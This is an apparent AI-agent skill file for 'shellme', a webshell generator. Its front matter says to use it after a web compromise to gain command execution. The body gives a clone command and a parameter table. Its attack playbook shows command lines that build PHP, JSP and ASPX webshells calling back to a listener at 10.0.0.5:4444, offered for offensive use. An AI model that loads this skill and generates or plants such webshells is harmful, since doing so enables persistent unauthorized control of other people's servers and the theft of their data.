---
name: shellme-webshell
description: "shellme: multilingual WebShell generation. Signals: webshell, rce, JSP, encoding."
zh-signals: "shellme: 多语言 WebShell 生成。信号:webshell,rce,JSP,编码。"
when-to-use: "Use when you need to generate a multilingual WebShell for command execution after a web compromise."
---

# shellme

- Attack Category: C13 Remote Command Execution and WebShell
- Upstream Repository: https://github.com/hatRiot/shellme
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/hatRiot/shellme
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 shellme.py -l 10.0.0.5 -p 4444 -o shell.php` | WebShell generation |
| `-o shell.jsp -p 443` | JSP |
| `-e` | Encoding |

## Attack Scenario Playbook

### Multilingual WebShell Generation

```bash
python3 shellme.py -l 10.0.0.5 -p 4444 -o cmd.aspx
# Pick the language + encoding
```

## Notes

A multilingual WebShell generator by hatRiot.
